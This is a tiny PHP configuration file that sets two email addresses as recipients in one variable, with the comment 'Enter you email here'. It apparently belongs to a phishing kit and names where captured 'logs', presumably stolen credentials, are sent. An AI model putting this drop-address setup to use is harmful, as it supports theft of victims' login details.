<?php



$sent1 ="logz2021@gmail.com, logsonedrive@yandex.ru";  //Enter you email here



?>